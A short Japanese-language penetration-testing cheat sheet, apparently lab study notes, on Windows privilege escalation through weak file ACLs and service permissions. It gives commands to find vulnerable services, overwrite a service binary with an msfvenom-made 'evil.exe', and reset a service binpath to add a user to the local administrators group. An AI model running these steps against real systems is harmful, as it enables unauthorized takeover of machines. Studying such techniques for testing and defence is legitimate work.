# Permissive File System ACLs

## SharpUp

GhostPack ツール スイートの [SharpUp](https://github.com/GhostPack/SharpUp/tree/master) を使用して、弱い ACL に問題のあるサービス バイナリをチェックできる

```
.\SharpUp.exe audit
```

## icacls を使用した権限の確認

```
icacls "<SharpUpで検出されたバイナリのPath>"
```

## 悪意のあるバイナリに置き換え

msfvenom で生成された悪意のあるバイナリと置き換えることができる。これにより、SYSTEM としてリバース シェルを提供したり、ローカル管理者ユーザーを追加してマシンに対する完全な管理制御を提供する

```
cmd /c copy /Y evil.exe "<SharpUpで検出されたバイナリのPath>"
sc start <SharpUpで検出されたバイナリ>
```

# Weak Service Permissions

## Checking Permissions with AccessChk

Sysinternals スイートの [AccessChk](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk) を使用して、サービスに対するアクセス許可を列挙する

```
accesschk.exe /accepteula -quvcw WindscribeService
```

## 悪意のあるバイナリに置き換え

権限を使用してバイナリ パスを悪意を持って変更する可能性がある。ユーザーをローカル管理者グループに追加するように変更してみる。選択したコマンドまたは実行可能ファイル (リバース シェル バイナリなど) を実行するためのバイナリ パスを設定できます。 `binpathをmsfvenomなどのバイナリに置き換えることでリバースシェルを実行できる`

```
sc config <SharpUpで検出されたバイナリ> binpath="cmd /c net localgroup administrators htb-student /add"
```

## サービスを再起動

サービスを再起動する事で置き換えたリバースシェルなどが実行される

```
sc stop <SharpUpで検出されたバイナリ>
sc start <SharpUpで検出されたバイナリ>
```















